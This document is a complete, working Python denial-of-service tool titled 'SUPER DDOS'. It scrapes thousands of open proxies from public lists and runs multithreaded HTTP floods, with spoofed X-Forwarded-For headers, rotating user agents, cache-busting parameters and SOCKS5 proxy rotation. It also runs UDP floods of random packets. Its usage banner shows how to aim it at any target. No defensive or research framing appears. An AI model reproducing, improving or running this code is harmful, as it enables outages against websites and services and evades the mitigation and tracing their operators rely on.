#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import time
import random
import socket
import struct
import ssl
import threading
import urllib.request
import urllib.parse
import re
from datetime import datetime

# Check and import optional modules
try:
    import requests
    HAVE_REQUESTS = True
except ImportError:
    HAVE_REQUESTS = False
    print("[!] requests module not found. Install: pip install requests")

try:
    import socks
    HAVE_SOCKS = True
except ImportError:
    HAVE_SOCKS = False
    print("[!] PySocks module not found. Install: pip install PySocks")

# Simple color functions
def print_status(msg):
    print(f"[+] {msg}")

def print_info(msg):
    print(f"[*] {msg}")

def print_error(msg):
    print(f"[!] {msg}")

def print_warn(msg):
    print(f"[-] {msg}")

# Proxy downloader
class ProxyDownloader:
    def __init__(self):
        self.proxies = []
        
    def download_proxies(self):
        """Download proxies from multiple sources"""
        print_status("Downloading proxies from multiple sources...")
        
        sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
            "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
            "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
            "https://www.proxy-list.download/api/v1/get?type=socks5",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt",
            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
            "https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
        ]
        
        total_proxies = 0
        for url in sources:
            try:
                req = urllib.request.Request(url, headers={
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36'
                })
                with urllib.request.urlopen(req, timeout=10) as resp:
                    data = resp.read().decode('utf-8', errors='replace')
                
                # Extract IP:Port
                found = re.findall(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s*[:\s]\s*(\d{2,5})', data)
                for ip, port in found:
                    port = int(port)
                    if 0 < port < 65536:
                        self.proxies.append(f"{ip}:{port}")
                        total_proxies += 1
                
                if len(found) > 0:
                    print_status(f"Downloaded {len(found)} proxies from {url.split('/')[2]}")
                    
            except Exception as e:
                pass
        
        # Remove duplicates
        self.proxies = list(set(self.proxies))
        print_status(f"Total unique proxies collected: {len(self.proxies)}")
        
        return len(self.proxies)
    
    def save_proxies(self, filename="proxies.txt"):
        """Save proxies to file"""
        with open(filename, 'w') as f:
            for proxy in self.proxies[:10000]:  # Save top 10000
                f.write(proxy + '\n')
        print_status(f"Saved {min(len(self.proxies), 10000)} proxies to {filename}")
        return filename

# HTTP Flood Class
class HTTPFlood:
    def __init__(self, target_url, threads, proxy_file, duration):
        self.target_url = target_url
        self.threads = min(threads, 1000)  # Limit for Termux
        self.proxy_file = proxy_file
        self.duration = duration
        
        # Parse URL
        parsed = urllib.parse.urlparse(target_url)
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        self.ssl = (parsed.scheme == 'https')
        self.path = parsed.path or '/'
        if parsed.query:
            self.path += '?' + parsed.query
        
        # Load proxies
        self.proxies = self.load_proxies()
        
        # User agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        ]
        
        # Stats
        self.requests_sent = 0
        self.bytes_sent = 0
        self.errors = 0
        self.lock = threading.Lock()
        self.running = True
        self.start_time = 0
    
    def load_proxies(self):
        """Load proxies from file"""
        proxies = []
        if os.path.exists(self.proxy_file):
            with open(self.proxy_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        proxies.append(line)
        
        if not proxies:
            print_warn("No proxies found. Generating test proxies...")
            for i in range(100):
                proxies.append(f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}:8080")
        
        random.shuffle(proxies)
        print_status(f"Loaded {len(proxies)} proxies")
        return proxies
    
    def worker(self, worker_id):
        """Worker thread for HTTP flood"""
        proxy_index = 0
        
        while self.running:
            # Check duration
            if time.time() - self.start_time >= self.duration:
                break
            
            try:
                # Get next proxy
                if proxy_index >= len(self.proxies):
                    proxy_index = 0
                proxy = self.proxies[proxy_index]
                proxy_index += 1
                
                # Parse proxy
                proxy_ip, proxy_port = proxy.split(':')
                proxy_port = int(proxy_port)
                
                # Random headers
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'en;q=0.7']),
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
                }
                
                # Random method
                method = random.choice(['GET', 'POST', 'HEAD'])
                
                # Build path with random parameter
                path = self.path
                if '?' in path:
                    path += f"&_={random.randint(0, 999999)}"
                else:
                    path += f"?_={random.randint(0, 999999)}"
                
                # Build HTTP request
                request = f"{method} {path} HTTP/1.1\r\n"
                request += f"Host: {self.host}\r\n"
                for k, v in headers.items():
                    request += f"{k}: {v}\r\n"
                request += "\r\n"
                request_data = request.encode()
                
                # Create socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                
                # Connect through proxy or direct
                if HAVE_SOCKS:
                    # Try SOCKS5 proxy
                    try:
                        s = socks.socksocket()
                        s.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
                        s.settimeout(3)
                        s.connect((self.host, self.port))
                        sock = s
                    except:
                        # Fallback to direct connection
                        sock.connect((self.host, self.port))
                else:
                    sock.connect((self.host, self.port))
                
                # SSL if needed
                if self.ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.host)
                
                # Send request
                sock.sendall(request_data)
                
                # Update stats
                with self.lock:
                    self.requests_sent += 1
                    self.bytes_sent += len(request_data)
                
                # Close socket
                sock.close()
                
            except Exception as e:
                with self.lock:
                    self.errors += 1
    
    def start(self):
        """Start the attack"""
        self.start_time = time.time()
        
        print_info(f"Starting HTTP flood on {self.target_url}")
        print_info(f"Threads: {self.threads}, Duration: {self.duration}s")
        print_info(f"Host: {self.host}, Port: {self.port}, SSL: {self.ssl}")
        
        # Start worker threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitor progress
        try:
            while self.running:
                elapsed = time.time() - self.start_time
                if elapsed >= self.duration:
                    break
                
                remaining = int(self.duration - elapsed)
                
                with self.lock:
                    rps = self.requests_sent / max(1, elapsed)
                
                print_status(
                    f"[{int(elapsed)}s/{self.duration}s] "
                    f"Requests: {self.requests_sent} | "
                    f"RPS: {rps:.1f} | "
                    f"Errors: {self.errors} | "
                    f"Remaining: {remaining}s"
                )
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print_warn("\nAttack stopped by user")
        
        self.running = False
        
        # Wait for threads
        for t in threads:
            t.join(timeout=1)
        
        # Final stats
        elapsed = time.time() - self.start_time
        print_status("\n=== ATTACK COMPLETE ===")
        print_status(f"Duration: {elapsed:.1f}s")
        print_status(f"Total Requests: {self.requests_sent}")
        print_status(f"Average RPS: {self.requests_sent / max(1, elapsed):.1f}")
        print_status(f"Total Errors: {self.errors}")
        print_status("=======================")

# UDP Flood Class
class UDPFlood:
    def __init__(self, target_ip, target_port, threads, duration):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = min(threads, 1000)
        self.duration = duration
        
        # Resolve hostname if needed
        try:
            socket.inet_aton(target_ip)
        except socket.error:
            try:
                self.target_ip = socket.gethostbyname(target_ip)
                print_info(f"Resolved {target_ip} -> {self.target_ip}")
            except:
                print_error(f"Cannot resolve {target_ip}")
                sys.exit(1)
        
        # Stats
        self.packets_sent = 0
        self.bytes_sent = 0
        self.errors = 0
        self.lock = threading.Lock()
        self.running = True
        self.start_time = 0
    
    def worker(self, worker_id):
        """Worker thread for UDP flood"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running:
            if time.time() - self.start_time >= self.duration:
                break
            
            try:
                # Random packet size
                size = random.randint(64, 1400)
                data = os.urandom(size)
                
                # Send packet
                sock.sendto(data, (self.target_ip, self.target_port))
                
                # Update stats
                with self.lock:
                    self.packets_sent += 1
                    self.bytes_sent += size
                    
            except Exception as e:
                with self.lock:
                    self.errors += 1
    
    def start(self):
        """Start UDP flood"""
        self.start_time = time.time()
        
        print_info(f"Starting UDP flood on {self.target_ip}:{self.target_port}")
        print_info(f"Threads: {self.threads}, Duration: {self.duration}s")
        
        # Start threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitor
        try:
            while self.running:
                elapsed = time.time() - self.start_time
                if elapsed >= self.duration:
                    break
                
                remaining = int(self.duration - elapsed)
                
                with self.lock:
                    pps = self.packets_sent / max(1, elapsed)
                    mbps = (self.bytes_sent / max(1, elapsed)) / (1024 * 1024)
                
                print_status(
                    f"[{int(elapsed)}s/{self.duration}s] "
                    f"Packets: {self.packets_sent} | "
                    f"PPS: {pps:.1f} | "
                    f"Speed: {mbps:.2f} MB/s | "
                    f"Errors: {self.errors} | "
                    f"Remaining: {remaining}s"
                )
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print_warn("\nAttack stopped by user")
        
        self.running = False
        
        # Wait for threads
        for t in threads:
            t.join(timeout=1)
        
        # Final stats
        elapsed = time.time() - self.start_time
        print_status("\n=== ATTACK COMPLETE ===")
        print_status(f"Duration: {elapsed:.1f}s")
        print_status(f"Total Packets: {self.packets_sent}")
        print_status(f"Average PPS: {self.packets_sent / max(1, elapsed):.1f}")
        print_status(f"Total Data: {self.bytes_sent / (1024*1024):.2f} MB")
        print_status("=======================")

# Main function
def main():
    # Check arguments
    if len(sys.argv) < 5:
        print("""
╔══════════════════════════════════════════════════════════╗
                        DDOS
╚══════════════════════════════════════════════════════════╝

USAGE:
    python ddos.py <method> <target> <threads> <duration> [proxy_file]

METHODS:
    http-flood  - HTTP/HTTPS flood attack
    udp-flood   - UDP flood attack
    auto        - Auto-download proxies then HTTP flood

EXAMPLES:
    python ddos.py http-flood https://example.com 500 600 auto
    python ddos.py http-flood https://target.com 1000 600 proxies.txt
    python ddos.py udp-flood target.com 80 1000 600
    python ddos.py auto https://target.com 500 600

ARGUMENTS:
    method      - Attack method
    target      - URL (for HTTP) or IP:Port (for UDP)
    threads     - Number of threads (max 1000 for Termux)
    duration    - Attack duration in seconds
    proxy_file  - Proxy file path or 'auto' to download
        """)
        return
    
    method = sys.argv[1].lower()
    target = sys.argv[2]
    threads = int(sys.argv[3])
    duration = int(sys.argv[4])
    proxy_file = sys.argv[5] if len(sys.argv) > 5 else "auto"
    
    # Limit threads for Termux
    if threads > 1000:
        print_warn(f"Limiting threads from {threads} to 1000 (Termux limit)")
        threads = 1000
    
    print_status("SUPER DDOS - Starting Attack")
    print_status(f"Method: {method}")
    print_status(f"Target: {target}")
    print_status(f"Threads: {threads}")
    print_status(f"Duration: {duration}s")
    
    # Handle auto proxy download
    if proxy_file == "auto" and method in ['http-flood', 'auto']:
        print_info("Auto-downloading proxies...")
        downloader = ProxyDownloader()
        downloader.download_proxies()
        proxy_file = downloader.save_proxies()
    
    # Start attack based on method
    if method in ['http-flood', 'auto']:
        if not target.startswith('http'):
            target = 'https://' + target
        
        flood = HTTPFlood(target, threads, proxy_file, duration)
        flood.start()
        
    elif method == 'udp-flood':
        # Parse target for UDP
        if ':' in target:
            host, port = target.split(':')
            port = int(port)
        else:
            host = target
            port = 80
        
        flood = UDPFlood(host, port, threads, duration)
        flood.start()
    
    else:
        print_error(f"Unknown method: {method}")
        print_info("Available methods: http-flood, udp-flood, auto")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_warn("\nAttack interrupted")
    except Exception as e:
        print_error(f"Error: {e}")
